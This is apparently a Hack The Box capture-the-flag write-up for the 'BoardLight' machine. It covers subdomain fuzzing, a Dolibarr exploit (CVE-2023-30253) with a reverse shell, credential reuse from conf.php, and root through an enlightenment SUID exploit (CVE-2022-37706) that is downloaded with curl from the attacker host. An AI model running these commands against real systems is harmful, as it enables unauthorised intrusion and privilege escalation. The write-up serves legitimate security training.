---
title: HTB - BoardLight
date: 2024-09-28 00:00:00 + 1000
categories: [Linux,Web App,CTF,HTB]
tags: [htb, CVE-2023-30253, CVE-2022-37706, WebExploitation, Dolibarr]
comments: false
---

The BoardLight HTB machine was compromised by exploiting a vulnerability (CVE-2023-30253) in a Dolibarr CRM instance found via subdomain enumeration with ffuf. This led to a web shell, further privilege escalation using an exploit for CVE-2022-37706 on a vulnerable `enlightenment` binary granted root access

## Common Enumeration

### Nmap

I fired up the `nmap -p- -sC -sV -oA recon/allport 10.10.11.11 --open` - which found two open ports (22,80)

- Full port scan `-p-`
- Script scanning `-sC` 
- Version detection `-sV`
- Save the results to `-oA recon/allport`

```bash
$ sudo nmap -p- -sC -sV -oA recon/allport 10.10.11.11 --open
[sudo] password for ctf: 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-05-26 17:52 AEST
Nmap scan report for 10.10.11.11
Host is up (0.0054s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 06:2d:3b:85:10:59:ff:73:66:27:7f:0e:ae:03:ea:f4 (RSA)
|   256 59:03:dc:52:87:3a:35:99:34:44:74:33:78:31:35:fb (ECDSA)
|_  256 ab:13:38:e4:3e:e0:24:b4:69:38:a9:63:82:38:dd:f4 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
|_http-server-header: Apache/2.4.41 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 13.51 seconds
```

Two ports open: 
- SSH (22)
- HTTP (80)

## Browsing Website (80)

The website itself looked pretty standard – a cybersecurity consulting firm touting their expertise. The site seemed pretty standard, built with PHP (you can tell by the file extensions). Nothing too flashy

![img](/assets/img/BoardLight/3.webp)

The contact form was a dead end – no response to my test message

![img](/assets/img/BoardLight/2.webp)

The footer showed the hostname "Board.htb" which I added to my `/etc/hosts` file the newsletter signup also led nowhere

![img](/assets/img/BoardLight/1.webp)

Same deal when I tried browsing with the actual domain

### Directory Brute Forcing and Fuzzing

I used `gobuster` - with a common wordlist to check for hidden directories. The results? Mostly uninteresting standard directories

```bash
$ gobuster dir -u http://board.htb/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-small-words.txt -x php -o recon/go.log -b 404,403
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://board.htb/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/raft-small-words.txt
[+] Negative Status codes:   404,403
[+] User Agent:              gobuster/3.6
[+] Extensions:              php
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/images               (Status: 301) [Size: 307] [--> http://board.htb/images/]
/cgi-bin              (Status: 301) [Size: 308] [--> http://board.htb/cgi-bin/]
/js                   (Status: 301) [Size: 303] [--> http://board.htb/js/]
/css                  (Status: 301) [Size: 304] [--> http://board.htb/css/]
/index.php            (Status: 200) [Size: 15949]
/contact.php          (Status: 200) [Size: 9426]
/about.php            (Status: 200) [Size: 9100]
/.                    (Status: 200) [Size: 15949]
/do.php               (Status: 200) [Size: 9209]
Progress: 86014 / 86016 (100.00%)
===============================================================
Finished
===============================================================
```

#### Fuzzing 

But then, `ffuf` - return the subdomain `crm`

```bash
$ ffuf -u http://10.10.11.11 -H "Host: FUZZ.board.htb" -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt -mc all -ac

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://10.10.11.11
 :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt
 :: Header           : Host: FUZZ.board.htb
 :: Follow redirects : false
 :: Calibration      : true
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: all
________________________________________________

crm                     [Status: 200, Size: 6360, Words: 397, Lines: 150, Duration: 43ms]
:: Progress: [4989/4989] :: Job [1/1] :: 1369 req/sec :: Duration: [0:00:05] :: Errors: 0 ::
```

Navigating to `http://crm.board.htb/` showed a Dolibarr login page, version 17.0.0. A quick search showed it was vulnerable to CVE-2023-30253

![img](/assets/img/BoardLight/4.webp)

That’s when I started digging, and I stumbled upon a juicy CVE: CVE-2023-30253. I’d actually exploited this one differently first time I tackled this box, but this time, there was a sweet Python script on GitHub. Time to put it to work! [Github CVE-2023-30253](https://github.com/Rubikcuv5/cve-2023-30253)

```bash
python3 CVE-2023-30253.py --url http://crm.board.htb -u admin -p admin -r  10.10.14.8 1337
```

And boom! I had a shell, but as the lowly `www-data` user

```bash
$ $ whoami
www-data
```

## Shell as www-data

I ran `linpeas` to see what I could find and it showed a interesting file

```bash
╔══════════╣ Analyzing Backup Manager Files (limit 70)
-rw-r--r-- 1 www-data www-data 5265 Mar  4  2023 /var/www/html/crm.board.htb/htdocs/admin/system/database.php
```

Contains the interesting files

```bash
$ $ cd /var/www/html/crm.board.htb/htdocs/admin/system/
$ $ ls -la
total 200
drwxr-xr-x 2 www-data www-data  4096 Mar  4  2023 .
drwxr-xr-x 6 www-data www-data  4096 Mar  4  2023 ..
-rw-r--r-- 1 www-data www-data  7738 Mar  4  2023 about.php
-rw-r--r-- 1 www-data www-data  3422 Mar  4  2023 browser.php
-rw-r--r-- 1 www-data www-data  7766 Mar  4  2023 constall.php
-rw-r--r-- 1 www-data www-data  8188 Mar  4  2023 database-tables.php
-rw-r--r-- 1 www-data www-data  5265 Mar  4  2023 database.php
-rw-r--r-- 1 www-data www-data  3753 Mar  4  2023 dbtable.php
-rw-r--r-- 1 www-data www-data 23726 Mar  4  2023 dolibarr.php
-rw-r--r-- 1 www-data www-data 19628 Mar  4  2023 filecheck.php
-rw-r--r-- 1 www-data www-data 14479 Mar  4  2023 modules.php
-rw-r--r-- 1 www-data www-data  1716 Mar  4  2023 os.php
-rw-r--r-- 1 www-data www-data 24747 Mar  4  2023 perf.php
-rw-r--r-- 1 www-data www-data 11280 Mar  4  2023 phpinfo.php
-rw-r--r-- 1 www-data www-data 31806 Mar  4  2023 security.php
-rw-r--r-- 1 www-data www-data  3236 Mar  4  2023 web.php
-rw-r--r-- 1 www-data www-data  2031 Mar  4  2023 xcache.php
-rw-r--r-- 1 www-data www-data  4639 Mar  4  2023 xdebug.php
```

There was also a `.github` directory – always a fun place to look!

```bash
╔══════════╣ Analyzing Github Files (limit 70)                                                                                           
drwxr-xr-x 4 www-data www-data 4096 Mar  4  2023 /var/www/html/crm.board.htb/.github
drwxr-xr-x 3 www-data www-data 4096 Mar  4  2023 /var/www/html/crm.board.htb/htdocs/includes/webklex/php-imap/.github
```

Unfortunately, there was nothing interesting within the `.github` folder

```bash
$ $ cd /var/www/html/crm.board.htb/htdocs/includes/webklex/php-imap/.github
$ $ ls
ISSUE_TEMPLATE
$ $ cat ISSUE_TEMPLATE
cat: ISSUE_TEMPLATE: Is a directory
$ $ cd ISSUE_TEMPLATE
$ $ ls
bug_report.md
feature_request.md
general-help-request.md
```

The `.github` directory didn't pan out. So, I moved another directory, `crm.board.htb`, under `/html`

```bash
$ cd html
$ ls
board.htb
crm.board.htb
```

This directory had the goods

```bash
$ cd crm.board.htb
$ ls
COPYING
COPYRIGHT
ChangeLog
DCO
README-FR.md
README.md
SECURITY.md
composer.json.disabled
documents
htdocs
nightwatch.conf.js
phpstan.neon
robots.txt
scripts
```

Inside, I found a `conf` directory, and within that, `conf.php` — containing the database credentials!

```bash
$ pwd
/var/www/html/crm.board.htb/htdocs/conf
$ ls
conf.php
conf.php.example
conf.php.old
```

`conf.php`, which contain the credential for database: `dolibarrowner:serverfun2$2023!!`

```bash
/ Take a look at conf.php.example file for an example of conf.php file
// and explanations for all possibles parameters.
//
$dolibarr_main_url_root='http://crm.board.htb';
$dolibarr_main_document_root='/var/www/html/crm.board.htb/htdocs';
$dolibarr_main_url_root_alt='/custom';
$dolibarr_main_document_root_alt='/var/www/html/crm.board.htb/htdocs/custom';
$dolibarr_main_data_root='/var/www/html/crm.board.htb/documents';
$dolibarr_main_db_host='localhost';
$dolibarr_main_db_port='3306';
$dolibarr_main_db_name='dolibarr';
$dolibarr_main_db_prefix='llx_';
$dolibarr_main_db_user='dolibarrowner';
$dolibarr_main_db_pass='serverfun2$2023!!';
$dolibarr_main_db_type='mysqli';
$dolibarr_main_db_character_set='utf8';
$dolibarr_main_db_collation='utf8_unicode_ci';
// Authentication settings
$dolibarr_main_authentication='dolibarr';
```

I tried accessing the database with those credentials, but no luck. However, `passwd` showed another user: `larissa`

```bash
$ cat /etc/passwd | grep sh$
root:x:0:0:root:/root:/bin/bash
larissa:x:1000:1000:larissa,,,:/home/larissa:/bin/bash
```

## Shell as larissa

With the `larissa:serverfun2$2023!!` I was able to login as larissa and grep the `user.txt`

```bash
larissa@boardlight:~$ ls
Desktop  Documents  Downloads  Music  Pictures  Public  Templates  user.txt  Videos
larissa@boardlight:~$ cat user.txt 
525a766...
larissa@boardlight:~$ 
```

user.txt

```text
525a766...
```

## Privilege escalation

The final leg! `linpeas` pointed out to `enlightenment`

```bash
╔══════════╣ SUID - Check easy privesc, exploits and write perms
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-and-suid
-rwsr-xr-x 1 root root 15K Jul  8  2019 /usr/lib/eject/dmcrypt-get-device
-rwsr-sr-x 1 root root 15K Apr  8 18:36 /usr/lib/xorg/Xorg.wrap
-rwsr-xr-x 1 root root 27K Jan 29  2020 /usr/lib/x86_64-linux-gnu/enlightenment/utils/enlightenment_sys (Unknown SUID binary!)
-rwsr-xr-x 1 root root 15K Jan 29  2020 /usr/lib/x86_64-linux-gnu/enlightenment/utils/enlightenment_ckpasswd (Unknown SUID binary!)
-rwsr-xr-x 1 root root 15K Jan 29  2020 /usr/lib/x86_64-linux-gnu/enlightenment/utils/enlightenment_backlight (Unknown SUID binary!)
-rwsr-xr-x 1 root root 15K Jan 29  2020 /usr/lib/x86_64-linux-gnu/enlightenment/modules/cpufreq/linux-gnu-x86_64-0.23.1/freqset (Unknown 
```

A quick Google search led me to this exploit: `https://github.com/MaherAzzouzi/CVE-2022-37706-LPE-exploit`. I downloaded it, ran it, and… root! Then I grabbed `root.txt`

```bash
larissa@boardlight:/dev/shm$ curl http://10.10.14.8:8000/exploit.sh -o exploit.sh
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100   709  100   709    0     0  21484      0 --:--:-- --:--:-- --:--:-- 21484
larissa@boardlight:/dev/shm$ ls
exploit.sh
larissa@boardlight:/dev/shm$ bash exploit.sh 
CVE-2022-37706
[*] Trying to find the vulnerable SUID file...
[*] This may take few seconds...
[+] Vulnerable SUID binary found!
[+] Trying to pop a root shell!
[+] Enjoy the root shell :)
mount: /dev/../tmp/: cant find in /etc/fstab.
# id
uid=0(root) gid=0(root) groups=0(root),4(adm),1000(larissa)
# ls
exploit.sh
# cd /root
# cat root.txt
ac9df48...
#
```

root.txt

```text
ac9df48...
```